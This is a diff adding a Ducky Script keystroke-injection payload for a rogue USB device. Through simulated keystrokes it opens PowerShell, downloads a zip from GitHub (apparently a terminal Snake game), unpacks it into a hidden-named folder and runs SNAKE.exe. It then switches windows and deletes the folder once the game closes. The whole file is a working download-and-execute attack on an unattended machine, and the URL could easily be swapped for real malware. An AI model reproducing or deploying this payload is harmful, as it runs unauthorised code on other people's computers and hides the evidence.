@@ -1,0 +1,48 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+STRING $Username = $env:USERNAME
+ENTER
+DELAY 500
+STRING cd C:\Users\$Username
+ENTER
+DELAY 500
+STRING New-Item -Path "C:\Users\$Username\AFOIUAGWEOIFGHLOIUAHWOIFUFHILUAWLFKUGH" -ItemType Directory
+ENTER
+DELAY 500
+STRING Add-Type -AssemblyName System.IO.Compression.FileSystem ; [System.IO.Compression.ZipFile]::CreateFromDirectory("C:\Users\$Username\AFOIUAGWEOIFGHLOIUAHWOIFUFHILUAWLFKUGH", "C:\Users\$Username\AFOIUAGWEOIFGHLOIUAHWOIFUFHILUAWLFKUGH.zip")
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "https://github.com/Deif1cGlue8855/Snake-in-terminal-C-/archive/refs/heads/main.zip" -OutFile "C:\Users\$Username\AFOIUAGWEOIFGHLOIUAHWOIFUFHILUAWLFKUGH.zip"
+ENTER
+DELAY 10000
+STRING Remove-Item C:\Users\$Username\AFOIUAGWEOIFGHLOIUAHWOIFUFHILUAWLFKUGH -Recurse -Force
+ENTER
+DELAY 500
+STRING Expand-Archive -Path "AFOIUAGWEOIFGHLOIUAHWOIFUFHILUAWLFKUGH.zip" -DestinationPath "C:\Users\$Username\AFOIUAGWEOIFGHLOIUAHWOIFUFHILUAWLFKUGH"
+ENTER
+DELAY 1000
+STRING Remove-Item C:\Users\$Username\AFOIUAGWEOIFGHLOIUAHWOIFUFHILUAWLFKUGH.zip -Recurse -Force
+ENTER
+DELAY 500
+STRING cd C:\Users\$Username\AFOIUAGWEOIFGHLOIUAHWOIFUFHILUAWLFKUGH\Snake-in-terminal-C--main\bin\Release\net6.0\
+ENTER
+DELAY 500
+STRING start SNAKE.exe
+ENTER
+DELAY 2000
+ALT TAB
+DELAY 500
+STRING cd C:\Users\$Username
+ENTER
+DELAY 500
+STRING $filePath = "C:\Users\$Username\AFOIUAGWEOIFGHLOIUAHWOIFUFHILUAWLFKUGH"
+ENTER
+DELAY 500
+STRING while (Get-Process -Name "powershell" -ErrorAction SilentlyContinue) {if ((Get-Process -Name "SNAKE" -ErrorAction SilentlyContinue)) {Start-Sleep -Seconds 1} else {Remove-Item $filePath -Recurse -Force; exit}}
+ENTER
+DELAY 500
+ALT TAB
